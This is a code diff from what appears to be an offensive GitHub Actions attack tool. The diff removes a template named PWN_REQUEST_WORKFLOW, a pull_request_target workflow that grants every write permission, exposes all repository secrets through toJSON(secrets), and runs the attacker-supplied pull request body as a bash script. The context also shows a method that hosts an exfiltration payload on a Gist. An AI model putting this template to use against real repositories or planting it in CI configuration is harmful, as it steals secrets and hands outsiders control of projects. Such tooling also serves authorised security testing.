@@ -105,37 +105,6 @@ else
 fi
 """
 
-    PWN_REQUEST_WORKFLOW = """name: Pull Request Linter
-on:
-  pull_request_target:
-    branches: [{0}]
-
-jobs:
-  permissions:
-    id-token: write
-    contents: write
-    pull-requests: write
-    actions: write
-    checks: write
-    deployments: write
-    issues: write
-    packages: write
-    pages: write
-    repository-projects: write
-    security-events: write
-    statuses: write
-  pwn:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Parse PR
-        env:
-          SECRETS: ${{{{ toJSON(secrets) }}}}
-          PR_BODY: ${{{{ github.event.pull_request.body }}}}
-        run: |
-          echo $PR_BODY > /tmp/pr.sh
-          bash /tmp/pr.sh
-"""
-
     @staticmethod
     def create_exfil_payload():
         """Creates a Gist hosting an exfiltration payload.
